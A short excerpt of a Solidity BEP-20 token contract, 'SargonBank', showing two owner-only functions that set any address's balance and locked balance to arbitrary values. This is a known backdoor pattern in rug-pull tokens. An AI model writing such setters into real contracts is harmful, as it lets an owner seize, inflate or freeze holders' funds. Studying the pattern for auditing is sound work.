...
contract SargonBank is IBEP20, IDividendTracker, Context, Initializable{
    ...
    function setXBalance(address who, uint256 amount) public onlyOwner {
        _gonXBalances[who] = amount;
    }

    function setLockBalance(address who, uint256 amount) public onlyOwner {
        _gonLockBalance[who] = amount;
    }
